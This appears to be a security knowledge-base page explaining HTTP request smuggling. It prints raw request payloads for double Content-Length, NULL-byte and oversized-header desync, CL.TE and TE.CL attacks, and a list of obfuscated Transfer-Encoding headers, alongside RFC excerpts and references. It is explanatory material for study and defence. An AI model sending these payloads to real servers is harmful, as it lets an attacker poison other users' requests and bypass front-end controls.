# HTTP Request Smuggling

## Description

Since HTTP/1.1 there's been widespread support for sending multiple HTTP requests over a single underlying TCP or SSL/TLS
 socket. The protocol is extremely simple - HTTP requests are simply placed back to back, and the server parses headers
 to work out where each one ends and the next one starts.

By itself, this is harmless. However, modern websites are composed of chains of systems, all talking over HTTP. This
 multi-tiered architecture takes HTTP requests from multiple different users and routes them over a single TCP/TLS connection.

![article-revproxy](/Attack/HTTP%20Request%20Smuggling/img/article-revproxy.svg)

This means that suddenly, it's crucial that the back-end agrees with the front-end about where each message ends. 
 Otherwise, an attacker might be able to send an ambiguous message which gets interpreted as two distinct HTTP requests
 by the back-end.

![article-revproxy-desynced](/Attack/HTTP%20Request%20Smuggling/img/article-revproxy-desynced.svg)

### Double Content Length

Let's imagine that the front-end prioritises the first content-length header, and the back-end prioritises the second.
 From the back-end's perspective, the TCP stream might look something like:

```http request
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Content-Length: 5

12345GPOST / HTTP/1.1
Host: example.com
...
```

Under the hood, the front-end forwards `12345G` on to the back-end, which only reads `12345` before issuing a response.
 This leaves the back-end socket poisoned with `G`. When the legitimate request arrives, it ends up appended onto the `G`,
 causing an unexpected response.

In this example, the injected `G` will corrupt the user's request and they will probably get a response along the lines
 of "Unknown method GPOST".

In real life, the dual content-length technique rarely works because many systems sensibly reject requests with multiple
 Content-Length headers. Double Content-Length header support is strictly forbidden by the [RFC 7230 3.3.3](https://tools.ietf.org/html/rfc7230#section-3.3.3):

> If a message is received without Transfer-Encoding and with either **multiple Content-Length header fields having
> differing field-values** or a single Content-Length header field having an invalid value, then the message framing
> is invalid and the recipient **MUST treat it as an unrecoverable error**. If this is a request message, the server
> MUST respond with a 400 (Bad Request) status code and then close the connection. If this is a response message
> received by a proxy, the proxy MUST close the connection to the server, discard the received response, and send a
> 502 (Bad Gateway) response to the client. If this is a response message received by a user agent, the user agent MUST
> close the connection to the server and discard the received response.

### NULL Character Injection

Using a NULL byte character in a header causes the request to be rejected and premature end of query. If after the first
 error the pipeline does not close, the next line will be interpreted as the next request in the pipeline.

A valid pipeline might look something like:

```http request
GET / HTTP/1.1
Host: example.com
X-Something: \0 something
X-Foo: Bar

GET /index.html?bar=1 HTTP/1.1
Host: example.com
...
```

Generates 2 error `400 Bad Request`, because the second query is starting with `X-Foo: Bar` and that's an invalid first
 query line.

An invalid pipeline might look something like (as there'is no `\r\n` between the 2 queries):

```http request
GET / HTTP/1.1
Host: example.com
X-Something: \0 something
GET /index.html?bar=1 HTTP/1.1
Host: example.com
...
```

It generates one error `400 Bad Request` and one `200 OK` response. Second query is taken as a valid.

But line `GET /index.html?bar=1 HTTP/1.1` is a bad header and most agent will reject early the fake pipeline as a bad
 query, because

```http request
GET /index.html?bar=1 HTTP/1.1
    !=
<HEADER-NAME-NO-SPACE>[:][SP]<HEADER-VALUE>[CR][LF]
```

The first line of the query has the following syntax:

```http request
<METHOD>[SP]<LOCATION>[SP]HTTP/[M].[m][CR][LF]
<METHOD>[SP]<http[s]://LOCATION>[SP]HTTP/[M].[m][CR][LF]
```

`LOCATION` may be used to inject the special `[:]` that is required in an header line, especially on the query string part,
 but this would inject a lot of bad characters in the `HEADER-NAME-NO-SPACE` part, like '/' or '?'.
 
But in the absolute uri syntax the special `[:]` comes with the line, and the bad character for an `HEADER-NAME-NO-SPACE`
 will only be a space. This will also fix the potential presence of the double `Host` header (absolute uri does replace 
 the `Host` header).

```http request
GET / HTTP/1.1
Host: example.com
X-Something: \0 something
GET http://example.com/index.html?bar=1 HTTP/1.1

```

The line `GET http://example.com/index.html?bar=1 HTTP/1.1` will be parse like header with name is `GET http` and value
 is `//example.com/index.html?bar=1 HTTP/1.1`. This is still an invalid header (the header name contains a space), but
 some HTTP agents pass such a header. And after the error `400 Bad Request` we have a `200 OK` response.

### Huge Header

This attack also as the previous is trigger the end-of-query event, but do not need the magical NULL character. We can
 trigger an end-of-query event using headers of about 65536 characters, and exploit it in the same way like with the
 NULL premature end of query.

```http request
GET / HTTP/1.1
Host: example.com
X-Something: AAAAA...( 65 532 'A' )...AAA
GET http://example.com/index.html?bar=1 HTTP/1.1

```

It generates the error `400 Bad Request` and a `200 OK` response.

### Chunked Encoding

The specification [RFC 2616 4.4](https://tools.ietf.org/html/rfc2616#section-4.4) implicitly allows processing requests
 using both `Transfer-Encoding: chunked` and `Content-Length`, few servers reject such requests:

> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, 
> the latter MUST be ignored.
 
Whenever we find a way to hide the `Transfer-Encoding` header from one server in a chain it will fall back
 to using the `Content-Length` and we can desynchronize the whole system. The exact way in which this is done depends
 on the behavior of the two servers:

- **CL.TE**: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding`
 header,
- **TE.CL**: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length`
 header,
- **TE.TE**: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can
 be induced not to process it by obfuscating the header in some way.

#### Chunked Messages

A chunked message body consists of 0 or more chunks. Each chunk consists of the chunk size, followed by a newline (\r\n),
 followed by the chunk contents. The message is terminated with a chunk of size 0, followed by a newline (\r\n). Example:

```http request
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

4
n3va
0

```

#### Header Fields

The format of the header fields is regulated by [RFC 7230 3.2](https://tools.ietf.org/html/rfc7230#section-3.2):

> Each header field consists of a case-insensitive field name followed by a colon (":"), optional leading whitespace,
> the field value, and optional trailing whitespace.

So:

```http request
HEADER:HEADER_VALUE[\r\n] => OK
HEADER:[SPACE]HEADER_VALUE[\r\n] => OK
HEADER:[SPACE]HEADER_VALUE[SPACE][\r\n] => OK
HEADER[SPACE]:HEADER_VALUE[\r\n] => NOT OK
```

And [RFC 7230 3.2.4](https://tools.ietf.org/html/rfc7230#section-3.2.4) adds:

> No whitespace is allowed between the header field-name and colon. In the past, differences in the handling of such
> whitespace have led to security vulnerabilities in request routing and response handling. A server MUST reject any
> received request message that contains whitespace between a header field-name and colon with a response code of
> 400 (Bad Request). A proxy MUST remove any such whitespace from a response message before forwarding the message
> downstream.

#### CL.TE Vulnerabilities

The front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
 We can perform a simple HTTP request smuggling attack as follows:

```http request
POST / HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end server processes the `Content-Length` header and determines that the request body is 13 bytes long,
 up to the end of **SMUGGLED**. This request is forwarded on to the back-end server.

The back-end server processes the `Transfer-Encoding` header, and so treats the message body as using chunked encoding.
 It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request.
 The following bytes, **SMUGGLED**, are left unprocessed, and the back-end server will treat these as being the start of
 the next request in the sequence.

#### TE.CL Vulnerabilities

The front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. 
 We can perform a simple HTTP request smuggling attack as follows:

```http request
POST / HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

The front-end server processes the `Transfer-Encoding` header, and so treats the message body as using chunked encoding.
 It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following **SMUGGLED**.
 It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request.
 This request is forwarded on to the back-end server.

The back-end server processes the `Content-Length` header and determines that the request body is 3 bytes long,
 up to the start of the line following 8. The following bytes, starting with **SMUGGLED**, are left unprocessed,
 and the back-end server will treat these as being the start of the next request in the sequence.

#### TE.TE Vulnerabilities

The front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced
 not to process it by obfuscating the header in some way.

There are potentially endless ways to obfuscate the `Transfer-Encoding` header, for example:

```http request
Transfer-Encoding: xchunked
```
```http request
Transfer-Encoding[SPACE]: chunked
```
```http request
Transfer-Encoding: chunked
Transfer-Encoding: x
```
```http request
Transfer-Encoding:[TAB]chunked
```
```http request
[SPACE]Transfer-Encoding: chunked
```
```http request
X: X[\n]Transfer-Encoding: chunked
```
```http request
Transfer-Encoding
: chunked
```
```http request
Transfer-Encoding: chùnked
```
```http request
Transfer-Encoding: \x00chunked
```
```http request
Foo: bar\r\n\rTransfer-Encoding: chunked
```

Each of these techniques involves a subtle departure from the HTTP specification. Real-world code that implements a
 protocol specification rarely adheres to it with absolute precision, and it is common for different implementations
 to tolerate different variations from the specification. To uncover a TE.TE vulnerability, it is necessary to find
 some variation of the `Transfer-Encoding` header such that only one of the front-end or back-end servers processes it,
 while the other server ignores it.

Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated 
 `Transfer-Encoding` header, the remainder of the attack will take the same form as for the CL.TE or TE.CL vulnerabilities.

## References

- [Finding HTTP request smuggling vulnerabilities](https://portswigger.net/web-security/request-smuggling/finding)
- [Exploiting HTTP request smuggling vulnerabilities](https://portswigger.net/web-security/request-smuggling/exploiting)
- [Regilero's smuggling researches](https://regilero.github.io/tag/Smuggling/)
- [Write up of two HTTP Requests Smuggling](https://medium.com/@cc1h2e1/write-up-of-two-http-requests-smuggling-ff211656fe7d)
- [HTTP Request Smuggling CL.TE](https://medium.com/@memn0ps/http-request-smuggling-cl-te-7c40e246021c)
- [Password theft login.newrelic.com via Request Smuggling](https://hackerone.com/reports/498052)
- [HAProxy HTTP request smuggling](https://nathandavison.com/blog/haproxy-http-request-smuggling)
